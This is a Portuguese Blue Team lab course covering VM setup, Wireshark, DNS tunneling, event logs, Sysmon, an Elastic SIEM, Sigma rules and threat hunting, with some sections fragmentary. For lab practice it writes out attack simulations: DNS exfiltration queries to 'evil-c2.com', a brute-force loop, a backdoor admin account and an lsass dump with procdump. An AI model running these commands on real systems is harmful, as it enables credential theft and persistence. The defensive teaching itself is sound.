LAB 0
Ambiente de Lab — VMs, ferramentas, rede isolada
// base para todos os outros labs · ~2h para montar
▾
O que você vai ter no final: Uma máquina Windows 10 com ferramentas de segurança instaladas e uma rede isolada para fazer experimentos sem risco. Tudo rodando no seu computador.
O que você precisa
  • Computador com pelo menos 8GB RAM (16GB ideal)
  • 50GB de espaço em disco livre
  • VirtualBox ou VMware Player (ambos gratuitos)
  • Boa vontade — esse setup você faz uma vez
1
Instale o VirtualBox
Baixe em virtualbox.org e instale normalmente. Escolha VirtualBox se não tiver preferência — é gratuito e completo.
2
Baixe o Windows 10 (imagem oficial da Microsoft — gratuita)
A Microsoft oferece VMs de avaliação gratuitas para desenvolvedores. Acesse: developer.microsoft.com/en-us/windows/downloads/virtual-machines/ e baixe a versão para VirtualBox. É um arquivo .zip com a VM pronta — só importar.
Importante: Essa VM expira em 90 dias. Tire um snapshot logo após configurar tudo — assim você pode restaurar sem precisar baixar de novo.
3
Importe a VM e crie uma rede interna (isolada)
No VirtualBox: File → Import Appliance → selecione o .ova baixado. Depois, vá em Settings da VM → Network → mude de "NAT" para Host-Only Adapter. Isso isola a VM — ela não acessa a internet, mas você consegue se comunicar com ela.
Por que isolar? Você vai executar malware real mais adiante. Com a rede isolada, ele não consegue se comunicar com servidores externos nem se espalhar.
4
Instale as ferramentas essenciais dentro da VM Windows
Ligue a VM, abra o browser e baixe/instale: 
# Ferramentas a instalar na VM Windows:

Sysinternals Suite → docs.microsoft.com/sysinternals  (Process Monitor, Autoruns, etc)
7-Zip              → 7-zip.org                    (para extrair amostras de malware)
Notepad++          → notepad-plus-plus.org        (editor de texto avançado)
Python 3           → python.org                   (scripts e automação)
5
Instale o Sysmon (você vai usar muito)
Sysmon é um serviço da Microsoft que gera logs muito mais detalhados que o Windows por padrão. É gratuito e essencial. 
# 1. Baixe o Sysmon do Sysinternals Suite (já vem no pacote)
# 2. Baixe uma config pronta — use a do SwiftOnSecurity:
#    github.com/SwiftOnSecurity/sysmon-config → sysmonconfig-export.xml

cd C:\Tools\Sysinternals

6
Tire um snapshot da VM limpa
No VirtualBox, com a VM rodando: Machine → Take Snapshot → chame de "Limpa - ferramentas instaladas". Assim você pode restaurar para esse estado limpo a qualquer momento.

LAB 1
TCP/IP com Wireshark — veja conexões reais acontecendo
// handshake, flags, port scan · ~3h
▾
Objetivo: Ver com seus próprios olhos como uma conexão TCP funciona, reconhecer um port scan nos pacotes, e entender por que isso importa para detectar atacantes.
1
Capture tráfego normal primeiro
Abra o Wireshark na VM. Selecione a interface de rede (geralmente "Ethernet"). Clique em Start. Agora abra o browser e acesse qualquer site HTTP (não HTTPS). Volte ao Wireshark e clique Stop após 30 segundos.
Dica: Use http://example.com — é um site HTTP simples que não redireciona para HTTPS. Perfeito para ver os pacotes.
2
Encontre o handshake TCP
No Wireshark, no campo de filtro, digite: tcp.flags.syn == 1 e pressione Enter. Você vai ver os pacotes SYN — o início de cada conexão TCP.
O que você está vendo — handshake normal
SYN — seu computador diz "quero conectar" ao servidor
SYN-ACK — servidor responde "ok, pode vir"
ACK — seu computador confirma "recebi, vamos começar"
Clique em um pacote SYN. No painel de baixo expanda "Transmission Control Protocol". Observe os campos Flags, Source Port, Destination Port.
3
Simule um port scan e veja como aparece
Agora você vai gerar tráfego "suspeito" para ver a diferença. Abra o PowerShell e rode: 
# Isso testa conexão nas portas 1 a 1024 do localhost
# É um "port scan" básico contra você mesmo — sem risco
1..1024 | ForEach-Object {
  $tcp = New-Object System.Net.Sockets.TcpClient
  $tcp.BeginConnect("127.0.0.1", $_, $null, $null) | Out-Null
  Start-Sleep -Milliseconds 10
  $tcp.Close()
}
Com o Wireshark capturando, aplique o filtro tcp.flags.syn == 1 and tcp.flags.ack == 0.
O que é suspeito — como um port scan aparece
Muitos pacotes SYN para portas sequenciais (1, 2, 3, 4...) em milissegundos
Muitos RST-ACK em resposta (porta fechada) — alta relação SYN/RST
Um único IP de origem varrendo dezenas/centenas de portas
Tempo entre pacotes: uniforme e muito rápido (automatizado)
Tráfego normal para comparar
Poucas conexões SYN para portas específicas (80, 443, 22)
Handshake completo SYN → SYN-ACK → ACK em seguida
Tempo entre conexões: variável (humano navegando)
4
Aprenda os filtros mais usados no dia a dia
# Filtros Wireshark que você vai usar como analista:

ip.addr == 192.168.1.10        # Todo tráfego de/para um IP específico
tcp.port == 443                # Tráfego HTTPS
dns                            # Somente tráfego DNS
http                           # Somente HTTP (não HTTPS)
tcp.flags.rst == 1             # Conexões resetadas (possível scan ou erro)
frame contains "password"      # Procura a palavra "password" nos pacotes
ip.dst == 8.8.8.8             # Tráfego para o DNS do Google

Pratique cada um. Entender esses filtros é o que diferencia quem "sabe Wireshark" de quem só abre o programa.

✓ Você aprendeu
Como uma conexão TCP abre e fecha (handshake de 3 vias)
Como um port scan se parece no tráfego — padrão de SYNs rápidos e sequenciais
Como filtrar tráfego no Wireshark para isolar o que importa
A diferença visual entre tráfego normal e tráfego de reconhecimento
LAB 2
DNS — como funciona e como atacantes abusam
// queries, respostas, tunneling · ~2h
▾
Objetivo: Entender como o DNS resolve nomes, identificar queries DNS normais vs suspeitas, e reconhecer o padrão de DNS tunneling — técnica usada por malware para se comunicar sem ser detectado.
1
Observe queries DNS normais
No Wireshark, inicie uma captura. No PowerShell, rode: 
nslookup google.com
nslookup microsoft.com
nslookup github.com
No Wireshark, filtre: dns. Observe cada query e sua resposta.
DNS normal — o que você vai ver
Query tipo A (IPv4) ou AAAA (IPv6) para nomes conhecidos
Subdomínio simples: google.com, www.microsoft.com
Tamanho da query: pequeno (40–80 bytes)
Resposta com 1–4 endereços IP
2
Simule o padrão de DNS tunneling
DNS tunneling esconde dados dentro de queries DNS. O malware codifica dados em Base64 e os coloca como subdomínio. Veja como isso parece: 
# Simule queries suspeitas no PowerShell (sem risco — não vai resolver)
nslookup "aGVsbG8gd29ybGQgdGhpcyBpcyBtYWx3YXJl.evil-c2.com"
nslookup "dXNlcm5hbWU6YWRtaW4gcGFzc3dvcmQ6MTIz.evil-c2.com"
nslookup "ZXhmaWx0cmF0aW5nIHNlbnNpdGl2ZSBkYXRh.evil-c2.com"
No Wireshark, filtre dns e compare com as queries anteriores.
Padrão de DNS tunneling — sinais de alerta
Subdomínio muito longo com caracteres aparentemente aleatórios (Base64)
Muitas queries para o mesmo domínio pai com subdomínios diferentes
Queries maiores que 100 bytes — DNS normal é pequeno
Tipos de query incomuns: TXT, NULL, CNAME usados com frequência alta
Alto volume de queries DNS de um único host em curto período
3
Veja como investigar um domínio suspeito
Em um incidente real, você vai receber um domínio suspeito para investigar. Pratique a investigação: 
# No PowerShell — investigue o domínio (pode usar internet aqui)

# Ver quando o domínio foi registrado (domínio recente = suspeito)
nslookup -type=TXT google.com

# Depois no browser, acesse e pesquise o domínio suspeito:
virustotal.com       # → aba Search → cole o domínio
abuseipdb.com        # → pesquise o IP resolvido
whois.domaintools.com# → data de registro, registrador
Regra prática: Domínio registrado há menos de 30 dias + detectado no VirusTotal + IPs em AbuseIPDB = IOC confirmado. Documente e adicione ao seu SIEM como regra de bloqueio.
✓ Você aprendeu
Como uma query DNS normal se parece no Wireshark
Os sinais visuais de DNS tunneling — subdomínio longo, Base64, alto volume
Como investigar um domínio suspeito usando VirusTotal e AbuseIPDB
Por que DNS é um canal favorito de C2 — passa pela maioria dos firewalls

LAB 3
Windows Event Logs — identifique ataques nos logs
// Event IDs críticos, brute-force, escalada · ~3h
▾
Objetivo: Gerar eventos de ataque na sua VM, depois encontrá-los no Event Viewer. Você vai simular um brute-force de senha e ver exatamente como ele aparece nos logs — e como detectá-lo.
1
Abra o Event Viewer e navegue até os logs de segurança
Pressione Win+R → digite eventvwr.msc → Enter. No painel esquerdo: Windows Logs → Security. Você vai ver centenas de eventos. No painel direito, clique em "Filter Current Log" e filtre pelo Event ID 4624.
Event IDs que você precisa decorar
4624 — Logon bem-sucedido
4625 — Falha de logon (senha errada)
4648 — Logon com credenciais explícitas (pass-the-hash)
4688 — Novo processo criado
4720 — Conta de usuário criada
4732 — Usuário adicionado a grupo privilegiado
7045 — Novo serviço instalado no sistema
2
Simule um brute-force e veja nos logs
No PowerShell da VM, rode esse script que simula tentativas de login com senha errada: 
# Simula 10 tentativas de login falhas seguidas de um sucesso
# Substitua "SeuUsuario" pelo seu usuário Windows
$usuario = "SeuUsuario"

# 10 tentativas com senha errada
1..10 | ForEach-Object {
  $senha_errada = ConvertTo-SecureString "senhaerrada$_" -AsPlainText -Force
  $cred = New-Object System.Management.Automation.PSCredential($usuario, $senha_errada)
  try { Start-Process cmd -Credential $cred -ErrorAction Stop } catch {}
}
Write-Host "10 tentativas falhas geradas"
Agora no Event Viewer, filtre por Event ID 4625. Você vai ver 10 eventos de falha.
Brute-force — como reconhecer
Múltiplos Event ID 4625 em sequência rápida (segundos entre eles)
Mesmo nome de usuário, IPs de origem iguais
Logon Type 3 (rede) ou Type 10 (RemoteInteractive = RDP)
Após as falhas, um 4624 (sucesso) — atacante entrou
Clique em um evento 4625. Examine os campos: Subject, Account Name, Logon Type, Source Network Address. Esses campos são o que você vai usar para criar regras de detecção.
3
Simule criação de usuário suspeito (escalada de privilégio)
# Crie um usuário backdoor (como um atacante faria)
# Abra PowerShell como Administrador
net user hacker S3nh@Secreta /add
net localgroup Administrators hacker /add

# Depois de observar os logs, remova o usuário:
net user hacker /delete
No Event Viewer, procure Event ID 4720 (conta criada) e 4732 (adicionado a grupo Administrators). Esses dois eventos juntos em segundos = persistência de atacante.
Criação de backdoor — sinais nos logs
4720 + 4732 em sequência no mesmo horário
Conta criada com nome genérico ou aleatório
Adicionada ao grupo "Administrators" ou "Remote Desktop Users"
Criada fora do horário comercial ou por conta de serviço
4
Aprenda a exportar logs para análise
# PowerShell — exportar eventos de segurança dos últimos 24h para CSV
$inicio = (Get-Date).AddHours(-24)
Get-WinEvent -FilterHashtable @{
  LogName = 'Security'
  Id = 4625, 4624, 4720, 4732, 4688
  StartTime = $inicio
} | Select TimeCreated, Id, Message |
Export-Csv C:\logs_seguranca.csv -NoTypeInformation
Abra o CSV no Excel ou Notepad++ e leia os eventos. Essa habilidade de exportar e analisar logs é o que você vai usar todo dia como analista Blue Team.
✓ Você aprendeu
Os 7 Event IDs mais importantes para Blue Team
Como um brute-force aparece nos logs — padrão de 4625 rápidos seguidos de 4624
Como um atacante cria persistência via usuário backdoor e como isso aparece em 4720+4732
Como exportar e filtrar logs com PowerShell para análise
LAB 4
Sysmon — logs avançados e detecção de execução suspeita
// process creation, network, registry · ~3h
▾
Objetivo: Usar o Sysmon (que você instalou no Lab 0) para ver informações que o Windows nativo não mostra — qual processo gerou qual, hashes de executáveis, conexões de rede por processo.
1
Entenda os Event IDs do Sysmon
Os logs Sysmon ficam em: Event Viewer → Applications and Services Logs → Microsoft → Windows → Sysmon → Operational 
# Event IDs do Sysmon que você vai usar muito:

1  — Process Creation      # qual processo foi criado, por qual processo pai, com qual hash
3  — Network Connection    # qual processo fez conexão de rede, para qual IP:porta
7  — Image Loaded          # qual DLL foi carregada por qual processo
8  — CreateRemoteThread    # injeção de código em outro processo (sempre suspeito)
10 — ProcessAccess         # processo acessando memória de outro (Mimikatz, por ex)
11 — FileCreate            # arquivo criado — útil para detectar dropper
12/13 — Registry Events    # modificação de registro — persistência
22 — DNS Query             # qual processo fez qual query DNS
2
Simule execução suspeita e rastreie no Sysmon
Uma técnica comum de malware é usar o Word ou Excel para executar um comando PowerShell. Vamos simular isso: 
# Abra o PowerShell e simule um processo filho suspeito
# (simula o comportamento de um macro malicioso executando cmd)
Start-Process powershell -ArgumentList "-NoProfile -Command 'cmd.exe /c whoami'"
No Sysmon (Event ID 1), filtre por: Event Viewer → Filter → Event ID 1. Procure o evento criado. Clique nele e veja:
Process Creation — campos importantes no Event ID 1
Image: caminho completo do executável criado
ParentImage: qual processo gerou esse filho — CRITICAL
CommandLine: argumentos usados — frequentemente revela intenção
Hashes: MD5/SHA256 do executável — pode checar no VirusTotal
User: qual conta executou — SYSTEM em horário estranho = alerta
Regra de ouro: Se o ParentImage for Word, Excel, Outlook, ou PDF reader e o filho for cmd.exe, powershell.exe, wscript.exe ou mshta.exe — é quase sempre malicioso. Essa é uma das detecções mais confiáveis em Blue Team.
3
Rastreie conexões de rede por processo (Event ID 3)
# Faça uma conexão de rede com o PowerShell (simula C2)
Invoke-WebRequest -Uri "http://example.com" -UseBasicParsing
Agora filtre no Sysmon por Event ID 3. Encontre o evento gerado. Você vai ver: qual processo (powershell.exe) conectou em qual IP e porta. Pegue o IP, vá ao VirusTotal e pesquise.
Conexões de rede suspeitas no Sysmon ID 3
cmd.exe ou powershell.exe fazendo conexão de rede direto (raro em uso legítimo)
Processo de sistema (svchost, lsass) conectando em IP externo não esperado
Porta de destino incomum: 4444, 1337, 8888 (portas típicas de C2)
Processo em pasta temp (%TEMP%, %APPDATA%) fazendo conexão
4
Use o Chainsaw para analisar logs mais rápido
O Chainsaw é uma ferramenta gratuita que analisa Event Logs do Windows e destaca eventos suspeitos automaticamente. 
# Baixe: github.com/WithSecureLabs/chainsaw
# Extraia e rode no PowerShell (Administrador):

# Analisa os logs de Segurança com regras Sigma pré-prontas:
.\chainsaw.exe hunt C:\Windows\System32\winevt\Logs\ `
  --sigma sigma/ `
  --mapping mappings/sigma-event-logs-all.yml `
  --output resultados.json
Ele vai mostrar todos os eventos suspeitos encontrados com descrição do que é cada um. É como ter um mini-SIEM local.
✓ Você aprendeu
Os Event IDs do Sysmon e o que cada um registra
Como rastrear a árvore de processos — qual criou qual (fundamental em IR)
A regra de ouro: processo Office gerando cmd.exe/powershell = malicioso
Como ver qual processo abriu qual conexão de rede com Sysmon ID 3
Como usar o Chainsaw para análise rápida de logs com regras Sigma
LAB 5
Active Directory — entenda o que atacantes exploram
// via TryHackMe · sem montar AD próprio · ~4h
▾
Objetivo: Entender os conceitos de AD e os ataques mais comuns sem precisar montar um ambiente completo. Você vai usar o TryHackMe que já tem os ambientes prontos.
Por que TryHackMe aqui? Montar um AD completo em lab exige tempo e recursos. O TryHackMe tem ambientes de AD prontos e guiados que ensinam o mesmo com menos fricção. O plano gratuito cobre o suficiente para começar.
1
Entenda os conceitos centrais (30 min de leitura)
Antes de ir pro TryHackMe, entenda esses termos — você vai ver em todo incidente: 
Domain Controller (DC)
  → O servidor que gerencia tudo no AD. Se um atacante compromete o DC,
    ele tem controle total do ambiente. Alvo #1 de ransomware enterprise.

Kerberos
  → Protocolo de autenticação do AD. Funciona com "tickets".
  → Kerberoasting: atacante pede tickets de serviços e tenta quebrar
    offline para obter senhas. Gera Event ID 4769 em volume alto.

Pass-the-Hash (PtH)
  → Atacante rouba o hash NTLM da senha (não a senha em si) e usa
    o hash diretamente para autenticar. Event ID 4624 com Logon Type 3.

DCSync
  → Atacante simula ser um DC e pede cópia dos hashes de todos os usuários.
    Gera Event ID 4662. Se não é um DC legítimo fazendo isso = grave.

BloodHound
  → Ferramenta que mapeia caminhos de escalada de privilégio no AD.
    Atacantes usam para encontrar o caminho até o Domain Admin.
    Defensores usam para encontrar e corrigir esses caminhos primeiro.
2
Faça os rooms de AD no TryHackMe
Acesse tryhackme.com e faça esses rooms em ordem: 
1. "Active Directory Basics"          → gratuito, conceitos fundamentais
2. "Attacktive Directory"              → ataque real guiado contra AD
3. "Investigating Windows"             → investigação de incidente em AD
4. "Blue Team" path                    → path completo de defesa
Cada room tem instruções passo a passo. Você recebe uma VM online — sem precisar instalar nada.
3
Saiba o que observar nos logs quando AD está sob ataque
Sinais de ataque ao AD nos logs
4769 em volume alto — Kerberoasting em andamento (pedidos de ticket de serviço)
4624 Logon Type 3 de IP externo/incomum — possível Pass-the-Hash
4662 com acesso ao objeto replicação — possível DCSync
BloodHound sendo executado — alto volume de consultas LDAP de um host
Novo Domain Admin criado — 4720 + 4728 (adicionado ao grupo Domain Admins)
✓ Você aprendeu
O que é um Domain Controller e por que é o alvo mais crítico
Os 4 ataques principais contra AD: Kerberoasting, PtH, DCSync, BloodHound
Os Event IDs que indicam cada tipo de ataque ao AD

LAB 6
Elastic Stack — monte seu SIEM gratuito
// Elasticsearch + Kibana + Beats · ~4h setup + labs
▾
Objetivo: Instalar o Elastic Stack (versão gratuita), enviar os logs do Sysmon para ele, e criar um dashboard que mostra atividade suspeita em tempo real. Esse é o workflow real de um analista Blue Team.
1
Instale o Elastic Stack no WSL2 ou numa VM Linux
O Elastic roda melhor em Linux. Use o WSL2 (Windows Subsystem for Linux) que já vem no Windows 10/11: 
# No PowerShell como Admin — instalar WSL2
wsl --install
# Reinicie, abra o Ubuntu que será instalado

# No terminal Ubuntu — instalar Elasticsearch
wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add -
sudo apt-get install apt-transport-https
echo "deb https://artifacts.elastic.co/packages/8.x/apt stable main" | sudo tee /etc/apt/sources.list.d/elastic-8.x.list
sudo apt-get update && sudo apt-get install elasticsearch kibana

# Inicie os serviços:
sudo systemctl start elasticsearch kibana
sudo systemctl enable elasticsearch kibana
Acesse http://localhost:5601 no browser — essa é a interface do Kibana (seu SIEM).
2
Instale o Winlogbeat para enviar logs do Windows para o Elastic
O Winlogbeat é um agente que coleta Event Logs do Windows e envia para o Elasticsearch. Instale na VM Windows: 
# Baixe em: elastic.co/downloads/beats/winlogbeat
# Extraia para C:\Program Files\Winlogbeat

# Edite o arquivo winlogbeat.yml:
winlogbeat.event_logs:
  - name: Security
  - name: Microsoft-Windows-Sysmon/Operational
  - name: System

output.elasticsearch:
  hosts: ["localhost:9200"]

# No PowerShell (Admin) — instale como serviço:
cd "C:\Program Files\Winlogbeat"
.\install-service-winlogbeat.ps1
Start-Service winlogbeat
Agora todos os logs do Windows e Sysmon estão fluindo para o Elasticsearch em tempo real.
3
Crie seu primeiro dashboard de segurança no Kibana
No Kibana (localhost:5601): 
# Passo a passo no Kibana:

1. Vá em Analytics → Discover
2. Crie um index pattern: "winlogbeat-*"
3. Em Discover, procure por: event.code: 4625
4. Você vai ver todas as falhas de logon
5. Clique em "Save" para salvar essa busca

# Outras queries úteis para explorar:
event.code: 4624 AND winlog.event_data.LogonType: 3   # logon remoto
event.code: 1 AND winlog.event_data.Image: *powershell* # PowerShell executado
event.code: 3 AND winlog.event_data.DestinationPort: 4444 # C2 porta comum
4
Replique ataques do Lab 3 e observe no SIEM em tempo real
Agora é onde tudo se conecta. Volte ao Lab 3, refaça os ataques (brute-force, criação de usuário). Com o SIEM aberto no Kibana em tempo real, observe os eventos chegando.
Isso é exatamente o dia a dia de um analista SOC: SIEM mostrando alertas em tempo real, você investigando o que é real vs falso positivo. Quanto mais você praticar isso, mais rápido fica na triagem.

LAB 7
Criar regras de detecção com Sigma e Elastic
// da hipótese à regra ativa · ~3h
▾
Objetivo: Criar uma regra de detecção do zero — da hipótese, à escrita da regra Sigma, até ativá-la no Elastic e testá-la gerando o ataque. Isso é exatamente o que um Threat Hunter faz.
1
Formule a hipótese (como um Threat Hunter pensa)
Vamos criar uma regra para detectar o ataque do Lab 4 (processo Office gerando PowerShell): 
# Hipótese baseada em MITRE ATT&CK T1059.001 + T1566.001:

HIPÓTESE: "Se um macro malicioso em documento Office for executado,
ele vai criar um processo filho (cmd.exe ou powershell.exe) a partir
de winword.exe, excel.exe, ou powerpnt.exe."

PERGUNTA AOS DADOS: Existem eventos Sysmon ID 1 onde o ParentImage
contém "WINWORD" ou "EXCEL" e o Image contém "powershell" ou "cmd"?

FALSO POSITIVO ESPERADO: Macros legítimas administrativas —
verificar se o usuário autorizou ou se o arquivo veio de email.
2
Escreva a regra em formato Sigma
Sigma é um formato universal para regras de detecção — você escreve uma vez e converte para qualquer SIEM (Elastic, Splunk, QRadar). Crie um arquivo macro_spawn.yml: 
title: Macro Office Executando Shell
id: a1b2c3d4-1234-5678-abcd-ef1234567890
status: test
description: Detecta processo Office gerando cmd.exe ou PowerShell
author: Seu Nome
date: 2024/01/01
references:
  - https://attack.mitre.org/techniques/T1059/001/
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith:
      - '\WINWORD.EXE'
      - '\EXCEL.EXE'
      - '\POWERPNT.EXE'
      - '\OUTLOOK.EXE'
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\wscript.exe'
      - '\mshta.exe'
  condition: selection
falsepositives:
  - Macros administrativas legítimas
level: high
tags:
  - attack.execution
  - attack.t1059.001
  - attack.t1566.001

# Converta a regra para KQL:

# A query KQL gerada vai ser algo como:
(winlog.event_data.ParentImage:(*\\WINWORD.EXE OR *\\EXCEL.EXE) AND
 winlog.event_data.Image:(*\\cmd.exe OR *\\powershell.exe))

Comandos essenciais do Volatility — faça cada um
# Substitua memory.dmp pelo nome do seu arquivo de dump

## PASSO 1: Liste todos os processos em execução no momento do dump
python3 vol.py -f memory.dmp windows.pslist
# O que procurar: processos com nomes estranhos, dois svchost.exe com pai diferente,
# ou processos em caminhos incomuns

## PASSO 2: Veja a árvore de processos (pai → filho)
python3 vol.py -f memory.dmp windows.pstree
# Procure: powershell.exe filho de Word, ou cmd.exe filho de processo suspeito

## PASSO 3: Veja conexões de rede ativas no momento do dump
python3 vol.py -f memory.dmp windows.netstat
# Procure: conexão ESTABLISHED para IP externo por processo inesperado

## PASSO 4: Detecte injeção de código em processos (DLL injection)
python3 vol.py -f memory.dmp windows.malfind
# malfind encontra regiões de memória com código executável injetado
# Saída: PID, endereço de memória, e o código injetado em hex

## PASSO 5: Extraia strings de um processo suspeito
python3 vol.py -f memory.dmp windows.strings --pid 1234
# Substitua 1234 pelo PID do processo suspeito
# Procure: URLs, IPs, paths de arquivo, strings de C2

Processo com nome legítimo (svchost.exe) mas rodando em caminho errado (C:\Users\... ao invés de C:\Windows\System32)

Indicators (aba vermelha)

   (essas funções são usadas para injeção de código em outros processos)

Strings
→ Procure: URLs, IPs, nomes de arquivo, chaves de registry

Libraries / Imports
→ WinINet.dll ou WinHTTP.dll = faz conexões HTTP (C2)
→ Crypt32.dll = criptografia (ransomware, ou esconde C2 traffic)
→ ws2_32.dll = conexões de socket (C2 raw)

Threat Hunting — do MITRE ATT&CK à caça nos logs
// hipóteses, queries, correlação · ~4h
▾
Objetivo: Executar um hunting completo — escolher uma técnica MITRE, gerar o ataque no lab, e caçar nos logs sem ter um alerta prévio. Você vai encontrar o ataque pelos seus rastros.
1
Escolha uma técnica MITRE para caçar
Acesse attack.mitre.org. Vá em Techniques → Credential Access → T1003 — OS Credential Dumping. Leia a descrição e as sub-técnicas. Essa é uma das técnicas mais usadas por ransomware. 
# Nossa hipótese de hunting:

TÉCNICA MITRE:  T1003.001 — LSASS Memory (dump de credenciais)
DESCRIÇÃO:     Atacante acessa o processo lsass.exe para extrair
                hashes de senhas e credenciais em memória.
FERRAMENTA:    Mimikatz é a mais famosa. Procdump da Sysinternals
                é usada para fazer dump do lsass de forma "legítima".

HIPÓTESE:      "Se um atacante tentou fazer dump do LSASS, eu vou encontrar
                no Sysmon Event ID 10 (ProcessAccess) um processo acessando
                lsass.exe com direitos de leitura de memória."
2
Gere o ataque no lab (de forma segura)
# No PowerShell como Administrador na VM isolada
# Use o Procdump (Sysinternals — ferramenta legítima, usada para dump)
# Baixe de: docs.microsoft.com/sysinternals

.\procdump64.exe -ma lsass.exe lsass_dump.dmp
# Isso cria um dump do processo lsass (onde ficam as credenciais)
# Atacantes fazem isso para depois extrair hashes offline
# NÃO vamos extrair os hashes — só gerar a atividade para detectar
3
Caça nos logs sem usar a regra pronta
No Kibana, sem usar filtros prontos — pense como um hunter: 
# Query 1: Quem acessou o processo lsass? (Sysmon ID 10)
event.code: 10 AND winlog.event_data.TargetImage: *lsass*

# Examine o resultado:
# SourceImage = quem acessou (seu procdump64.exe)
# GrantedAccess = que tipo de acesso (0x1fffff = full access = muito suspeito)
# CallTrace = rastro da chamada de sistema (NTDLL → MaliciousDLL?)

# Query 2: Verificação cruzada — arquivo .dmp criado?
event.code: 11 AND winlog.event_data.TargetFilename: *.dmp

# Query 3: Qual processo criou o arquivo .dmp?
event.code: 1 AND winlog.event_data.Image: *procdump*
O que você encontrou — o que confirma o hunting
ID 10: SourceImage inesperado acessando lsass.exe com GrantedAccess 0x1fffff
ID 11: arquivo .dmp criado em pasta temp ou desktop
ID 1: processo desconhecido ou em caminho suspeito criado antes do acesso
Correlação temporal: os 3 eventos em sequência no mesmo minuto
4
Documente o hunting e converta em regra permanente
# Template de documentação de um hunting:

DATA:          2024-01-15
HUNTER:        Seu nome
HIPÓTESE:      Atacante realizou dump de credenciais do LSASS
TÉCNICA:       MITRE T1003.001
FONTE DE DADOS: Sysmon Event ID 10, 11, 1

RESULTADO:    VERDADEIRO POSITIVO — encontrado procdump acessando lsass
EVIDÊNCIAS:   IDs dos eventos encontrados, timestamp, SourceImage, GrantedAccess

AÇÃO:         Converter hipótese em regra Sigma permanente no SIEM
FALSOS POSITIVOS MAPEADOS: Windows Defender legítimo acessa lsass (filtrar)

PRÓXIMOS PASSOS: Verificar outros hosts na rede com a mesma query
